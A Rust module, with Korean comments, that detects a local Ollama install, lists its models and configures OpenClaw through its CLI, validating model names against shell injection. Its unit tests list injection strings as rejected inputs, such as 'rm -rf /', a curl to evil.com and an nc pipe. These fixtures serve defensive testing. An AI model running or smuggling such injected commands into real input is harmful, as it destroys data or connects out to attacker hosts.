//! Ollama 로컬 LLM 라이프사이클 헬퍼.
//!
//! 우리는 Ollama 데몬 자체는 시작하지 않는다 — 사용자가 직접 켜둔 Ollama에 HTTP로 붙는다.
//! 단 *바이너리 설치 여부*와 *실행 상태(11434)*, *설치된 모델 목록*은 감지한다.
//!
//! 모델 pull과 brew/winget 설치는 frontend에서 `@tauri-apps/plugin-shell`로 직접
//! 스트리밍 처리한다 (capabilities/default.json에 명령 화이트리스트).

use std::process::Command;
use std::time::Duration;

/// Ollama 데몬 기본 포트
pub const OLLAMA_PORT: u16 = 11434;

/// `ollama` CLI가 설치되어 있는지 확인.
pub async fn is_ollama_installed() -> serde_json::Value {
    if let Ok(output) = Command::new("ollama").arg("--version").output() {
        if output.status.success() {
            let version = String::from_utf8_lossy(&output.stdout).trim().to_string();
            return serde_json::json!({
                "installed": true,
                "version": version,
                "source": "path"
            });
        }
    }
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string());
    if let Ok(output) = Command::new(&shell)
        .args(["-lc", "ollama --version"])
        .output()
    {
        if output.status.success() {
            let version = String::from_utf8_lossy(&output.stdout).trim().to_string();
            return serde_json::json!({
                "installed": true,
                "version": version,
                "source": "login-shell"
            });
        }
    }
    serde_json::json!({ "installed": false, "version": null, "source": null })
}

/// Ollama 데몬이 11434에서 응답하는지 확인 (HTTP /api/tags).
pub async fn is_ollama_running() -> bool {
    let client = match reqwest::Client::builder()
        .timeout(Duration::from_millis(500))
        .build()
    {
        Ok(c) => c,
        Err(_) => return false,
    };
    let url = format!("http://127.0.0.1:{}/api/tags", OLLAMA_PORT);
    matches!(client.get(&url).send().await, Ok(r) if r.status().is_success())
}

/// 설치된 Ollama 모델 목록 — HTTP /api/tags를 그대로 반환한다.
/// 실패 시 빈 리스트.
pub async fn list_ollama_models() -> serde_json::Value {
    let client = match reqwest::Client::builder()
        .timeout(Duration::from_secs(3))
        .build()
    {
        Ok(c) => c,
        Err(_) => return serde_json::json!({ "models": [] }),
    };
    let url = format!("http://127.0.0.1:{}/api/tags", OLLAMA_PORT);
    match client.get(&url).send().await {
        Ok(resp) if resp.status().is_success() => {
            match resp.json::<serde_json::Value>().await {
                Ok(json) => json,
                Err(_) => serde_json::json!({ "models": [] }),
            }
        }
        _ => serde_json::json!({ "models": [] }),
    }
}

/// 종합 상태 — UI 단일 호출로 모든 정보 받기.
pub async fn get_ollama_status() -> serde_json::Value {
    let installed_info = is_ollama_installed().await;
    let running = is_ollama_running().await;
    let models = if running {
        list_ollama_models().await
    } else {
        serde_json::json!({ "models": [] })
    };
    serde_json::json!({
        "installed": installed_info["installed"],
        "version": installed_info["version"],
        "running": running,
        "port": OLLAMA_PORT,
        "models": models["models"],
    })
}

/// OpenClaw 설정을 Ollama로 맞춘다.
///
/// 비인터랙티브로 실행:
///   1. `openclaw config set models.providers.ollama.baseUrl http://127.0.0.1:11434`
///   2. `openclaw config set agents.defaults.model ollama/<model>`
///
/// `model`은 `llama3.2:latest` 같은 전체 태그를 받음.
pub async fn configure_openclaw_ollama(model: &str) -> Result<serde_json::Value, String> {
    validate_model_name(model)?;

    let runs = [
        (
            "models.providers.ollama.baseUrl",
            format!("http://127.0.0.1:{}", OLLAMA_PORT),
        ),
        (
            "agents.defaults.model",
            format!("ollama/{}", model),
        ),
    ];

    let mut applied = Vec::new();
    for (path, value) in runs.iter() {
        let result = run_openclaw_config_set(path, value).await?;
        applied.push(serde_json::json!({ "path": path, "value": value, "stdout": result }));
    }

    Ok(serde_json::json!({
        "ok": true,
        "applied": applied,
        "model": format!("ollama/{}", model),
    }))
}

/// `openclaw config set <path> <value>`를 비동기로 실행하고 stdout 반환.
async fn run_openclaw_config_set(path: &str, value: &str) -> Result<String, String> {
    let path = path.to_string();
    let value = value.to_string();
    let result = tokio::task::spawn_blocking(move || {
        // 1차: 직접 실행
        let direct = Command::new("openclaw")
            .args(["config", "set", &path, &value])
            .output();
        if let Ok(out) = direct {
            if out.status.success() {
                return Ok(String::from_utf8_lossy(&out.stdout).to_string());
            }
            // 실패면 stderr 포함해서 다음 시도
            let _ = String::from_utf8_lossy(&out.stderr);
        }
        // 2차: 로그인 셸
        let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string());
        let cmd = format!("openclaw config set {} {}", shell_quote(&path), shell_quote(&value));
        let via_shell = Command::new(&shell).args(["-lc", &cmd]).output();
        match via_shell {
            Ok(out) if out.status.success() => {
                Ok(String::from_utf8_lossy(&out.stdout).to_string())
            }
            Ok(out) => Err(format!(
                "openclaw config set 실패 (code {:?}): {}",
                out.status.code(),
                String::from_utf8_lossy(&out.stderr).trim()
            )),
            Err(e) => Err(format!("openclaw 실행 실패: {}", e)),
        }
    })
    .await
    .map_err(|e| format!("작업 join 실패: {}", e))?;
    result
}

/// shell single-quote escaping — 사용자 입력은 위에서 이미 sanitize했지만 path에 dot이 있어 따옴표 필요.
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// 모델명에 셸 메타문자가 들어있지 않은지 검증.
///
/// `phi3.5`, `llama3.2:latest`, `qwen2.5:7b-instruct` 같은 합법적인 Ollama 태그는 허용하고,
/// 공백/세미콜론/파이프/달러/백틱/백슬래시 등 명령 인젝션 가능 문자는 거부.
pub(crate) fn validate_model_name(model: &str) -> Result<(), String> {
    if model.is_empty()
        || model
            .chars()
            .any(|c| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '$' | '`' | '\\'))
    {
        return Err(format!("모델 이름이 유효하지 않습니다: {}", model));
    }
    Ok(())
}

// ── 단위 테스트 ────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validate_accepts_common_ollama_tags() {
        for ok in [
            "phi3.5",
            "phi3.5:latest",
            "llama3.2",
            "llama3.2:3b-instruct-q4_0",
            "qwen2.5:7b",
            "gemma2:2b",
        ] {
            assert!(
                validate_model_name(ok).is_ok(),
                "정상 모델명을 거부함: {}",
                ok
            );
        }
    }

    #[test]
    fn validate_rejects_empty_string() {
        assert!(validate_model_name("").is_err());
    }

    #[test]
    fn validate_rejects_shell_metachars() {
        // 명령 인젝션 가능 문자 차단 — Tauri shell scope를 거치지 않고 호출되는 경로 보호
        for bad in [
            "phi3.5; rm -rf /",
            "phi3.5 && curl evil.com",
            "phi3.5 | nc evil 1234",
            "phi3.5`whoami`",
            "phi3.5$IFS",
            "phi3.5\\nrm",
            " phi3.5",   // leading whitespace
            "phi3.5\n",  // trailing newline
            "phi 3.5",   // embedded space
        ] {
            assert!(
                validate_model_name(bad).is_err(),
                "위험한 모델명을 통과시킴: {:?}",
                bad
            );
        }
    }

    #[test]
    fn shell_quote_escapes_single_quotes() {
        // path 자체에 dot이 있어 따옴표 처리 필요. 만약 path에 따옴표가 들어가도 깨지면 안 됨.
        assert_eq!(shell_quote("agents.defaults.model"), "'agents.defaults.model'");
        assert_eq!(shell_quote("foo'bar"), "'foo'\\''bar'");
    }

    #[test]
    fn ollama_port_is_default_llm_port() {
        // 11434는 Ollama 공식 기본 포트 — 변경 시 sidecar/config도 같이 손봐야 함을 알리는 가드
        assert_eq!(OLLAMA_PORT, 11434);
    }
}
